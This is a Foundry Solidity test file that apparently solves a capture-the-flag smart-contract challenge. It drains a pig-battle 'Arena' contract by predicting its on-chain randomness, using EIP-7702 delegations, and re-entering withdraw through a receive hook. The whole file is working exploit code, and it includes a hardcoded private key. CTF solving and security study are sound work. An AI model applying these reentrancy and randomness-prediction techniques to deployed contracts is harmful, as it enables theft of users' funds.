// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console, Vm} from "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/Arena.sol";

contract Exploit is Test {
    Challenge public challenge;
    Arena public arena;
    Randomness public randomness;

    address system = makeAddr("system");
    address player;
    uint256 playerPk;

    uint256 internal _nonce;

    modifier runAsPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
    }

    modifier solved() {
        _;
        _isSolved();
    }

    /**
     * setup chall' locally
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");

        startHoax(system);
        payable(player).transfer(8 ether);
        challenge = new Challenge{value: 500 ether}();
        arena = challenge.arena();
        vm.stopPrank();
    }

    function test_runSploit() external solved {
        step1(); // player
        _doBattle(); // server role
        step2(); // player
    }

    function step1() internal runAsPlayer {
        uint256 agentPk = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

        // sending some eth for gas usage of our agent
        (bool success, ) = vm.addr(agentPk).call{value: 0.1 ether}("");
        require(success, "sending ether to our agent failed");

        bytes memory code = type(MyAgent).creationCode;
        address agentImplementation;

        uint256 i = 0;
        while (true) {
            assembly {
                agentImplementation := create2(
                    0,
                    add(code, 0x20),
                    mload(code),
                    i
                )
            }
            bytes20 _test = (bytes20(address(agentImplementation)));
            if (jailbreaker(_test)) {
                break;
            }
            i++;
        }

        // Agent signs a delegation allowing `agentImplementation` to execute transactions on its behalf.
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(agentImplementation),
            agentPk
        );
        vm.attachDelegation(signedDelegation);

        // now lets register user and ask for bloooood
        arena.deposit{value: 7 ether}();
        arena.register(vm.addr(agentPk));
        arena.claimPig();
        arena.claimPig();
        arena.claimPig();
        arena.requestBattle(address(challenge), 5.9 ether); // 5.9 because if we win we've enough to withdraw (> 10 ether in total), and that let us some wei for gas usage
    }

    function step2() internal runAsPlayer {
        MyEOAImplementation eoaImplem = new MyEOAImplementation();
        // We signs a delegation allowing a contract to execute transactions on our behalf (allowing reentrancy with an EOA).
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(eoaImplem),
            playerPk
        );
        vm.attachDelegation(signedDelegation);
        (bool success,) = address(player).call(
            abi.encodeWithSignature("gogogo(address)", address(arena))
        );
        require(success, "Reentrancy failed :(");

        console.log("player arena.balance:", arena.balanceOf(player));
        console.log("chal arena.balance:", arena.balanceOf(address(challenge)));
        console.log("player balance ether:", player.balance);
        console.log(challenge.isSolved());
    }

    function jailbreaker(bytes20 data) internal pure returns (bool) {
        for (uint256 i = 0; i < data.length; i++) {
            uint8 b = uint8(data[i]);
            if (
                (b >= 0xf0 && b <= 0xf2) ||
                (b >= 0xf4 && b <= 0xf5) ||
                (b == 0xff)
            ) {
                return false;
            }
        }
        return true;
    }

    function _doBattle() internal {
        vm.recordLogs();
        _mimicServerSideBattle();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint i = 0; i < logs.length; i++) {
            Vm.Log memory log = logs[i];
            address player1 = address(uint160(uint256(log.topics[1])));
            address player2 = address(uint160(uint256(log.topics[2])));
            (uint256 winner, uint256 wager) = abi.decode(
                log.data,
                (uint256, uint256)
            );
            console.log("BattleResult:");
            console.log(" - player1:", player1);
            console.log(" - player2:", player2);
            console.log(" - winner: ", winner == 0 ? player1 : player2);
            console.log(" - wager:  ", wager);
        }
    }

    function _isSolved() internal view {
        assertTrue(challenge.isSolved());
    }

    // fake random just for the local tests purpose
    function _rand() internal returns (uint256) {
        _nonce++;
        return
            uint256(
                keccak256(
                    abi.encodePacked(block.timestamp, block.prevrandao, _nonce)
                )
            );
    }

    function _mimicServerSideBattle() internal {
        vm.startPrank(system, system);
        challenge.arena().processBattle(_rand());
        vm.stopPrank();
    }
}

contract MyAgent {
    function acceptBattle(address, uint256) external pure returns (bool) {
        return true;
    }

    function tick(
        address,
        uint256,
        uint256,
        Arena.Pig[] memory fromPigs,
        Arena.Pig[] memory toPigs
    ) external returns (uint256 fromWhich, uint256 toWhich, uint256 r) {
        fromWhich = 0;
        toWhich = 0;
        uint256 maxAttack = 0;
        for (uint256 i = 0; i < fromPigs.length; i++) {
            if (fromPigs[i].health > 0 && fromPigs[i].attack > maxAttack) {
                maxAttack = fromPigs[i].attack;
                fromWhich = i;
            }
        }
        maxAttack = 0;
        for (uint256 i = 0; i < toPigs.length; i++) {
            if (toPigs[i].health > 0 && toPigs[i].attack > maxAttack) {
                maxAttack = toPigs[i].attack;
                toWhich = i;
            }
        }
        uint256 seed = Randomness(Arena(msg.sender).randomness()).random();
        r =
            uint256(
                keccak256(
                    abi.encodePacked(
                        uint256(block.prevrandao),
                        address(msg.sender),
                        seed
                    )
                )
            ) %
            100; // next value pre-calculated
    }
}

contract MyEOAImplementation {
    function gogogo(address arena) external {
        Arena(arena).transfer(address(0), 1); // to warm up the storage slots following https://github.com/ethereum/EIPs/blob/master/EIPS/eip-2929.md
        Arena(arena).withdraw(Arena(arena).balanceOf(address(this)));
        Arena(arena).withdraw(address(arena).balance);
    }

    receive() external payable {
        assembly {
            // » chisel  
            // ➜ keccak256("transfer(address,uint256)") // selector calculation
            // Type: bytes32
            // └ Data: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b
            // keepin' only 4bytes: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b -> 0xa9059cbb00000000000000000000000000000000000000000000000000000000
            mstore(
                0x00,
                0xa9059cbb00000000000000000000000000000000000000000000000000000000
            ) 
            mstore(0x24, 1)
            pop(call(
                gas(),
                0xb4f257A619B2cc621326d51682a88d00bd5eBB07, // arena
                0,
                0x00,
                0x44,
                0x00,
                0x00
            ))
        }
    }
}
